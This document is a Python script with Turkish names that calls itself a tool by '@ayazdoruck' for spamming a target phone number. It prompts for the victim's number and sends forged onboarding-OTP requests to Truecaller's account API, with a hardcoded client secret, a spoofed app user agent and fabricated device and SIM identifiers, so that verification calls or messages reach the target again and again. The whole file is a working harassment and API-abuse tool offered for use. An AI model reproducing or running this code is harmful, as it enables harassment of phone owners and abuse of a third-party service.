import os
import requests
import random
import hashlib
import time
import json
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

def temizle_konsol():
    if os.name == 'nt':  # Windows
        os.system('cls')
    else:  # MacOS, Linux
        os.system('clear')

sayi_kumesi = '123456789'
md5 = hashlib.md5(''.join(random.choice(sayi_kumesi) for _ in range(10)).encode()).hexdigest()[:16]

istemci_sifresi = 'lvc22mp3l1sfv6ujg83rd17btt'
kullanici_ajani = 'Truecaller/12.34.8 (Android;8.1.2)'
sikistirma = 'gzip'
icerik_uzunlugu = '680'
icerik_tipi = 'application/json; charset=UTF-8'
host = 'account-asia-south1.truecaller.com'
basliklar = {
    'clientsecret': istemci_sifresi,
    'user-agent': kullanici_ajani,
    'accept-encoding': sikistirma,
    'content-length': icerik_uzunlugu,
    'content-type': icerik_tipi,
    'Host': host
}

url = 'https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp'

def spam_gonder(telefon_numarasi):
    veri = {
        "countryCode": "eg",
        "dialingCode": 20,
        "installationDetails": {
            "app": {
                "buildVersion": 8,
                "majorVersion": 12,
                "minorVersion": 34,
                "store": "GOOGLE_PLAY"
            },
            "device": {
                "deviceId": md5,
                "language": "ar",
                "manufacturer": "Xiaomi",
                "mobileServices": ["GMS"],
                "model": "Redmi Note 8A Prime",
                "osName": "Android",
                "osVersion": "7.1.2",
                "simSerials": ["8920022021714943876f", "8920022022805258505f"]
            },
            "language": "ar",
            "sims": [
                {"imsi": "602022207634386", "mcc": "602", "mnc": "2", "operator": "vodafone"},
                {"imsi": "602023133590849", "mcc": "602", "mnc": "2", "operator": "vodafone"}
            ],
            "storeVersion": {"buildVersion": 8, "majorVersion": 12, "minorVersion": 34}
        },
        "phoneNumber": telefon_numarasi,
        "region": "region-2",
        "sequenceNo": 1
    }
    yanit = requests.post(url, headers=basliklar, data=json.dumps(veri))
    if yanit.status_code == 200:
        print(Fore.GREEN + 'Arama gönderildi.\n')
    else:
        print(Fore.RED + 'Arama gönderilemedi.\n')

def yukleniyor_animasyonu(sure):
    animasyon_karakterleri = "|/-\\"
    son_zaman = time.time() + sure
    while time.time() < son_zaman:
        for karakter in animasyon_karakterleri:
            print(Fore.YELLOW + f"\rYükleniyor... {karakter}", end="")
            time.sleep(0.1)
    print("\r" + " " * 30)  # Animasyonu silmek için

def iyi_gunler_animasyonu():
    mesaj = "AyazDoruck iyi günler diler!"
    for i in range(1):
        for j in range(len(mesaj)):
            print(Fore.LIGHTYELLOW_EX + f"\r{mesaj[:j+1]}", end="")
            time.sleep(0.2)
        time.sleep(0.5)

def main():
    temizle_konsol()
    print(Fore.MAGENTA + Style.BRIGHT + "Hoş Geldiniz!\n" + Fore.CYAN + "Bu araç @ayazdoruck tarafından geliştirilmiştir.")
    yukleniyor_animasyonu(7)
    
    while True:
        temizle_konsol()
        telefon_numarasi = input(Fore.CYAN + "Hedef Telefon No: ")
        spam_gonder(telefon_numarasi)
        time.sleep(1)
        temizle_konsol()
        devam = input(Fore.YELLOW + "Devam etmek ister misiniz? (evet/hayır): ").strip().lower()
        if devam != 'evet':
            temizle_konsol()
            time.sleep(1)
            iyi_gunler_animasyonu()
            time.sleep(1.5)
            temizle_konsol()
            break

if __name__ == "__main__":
    main()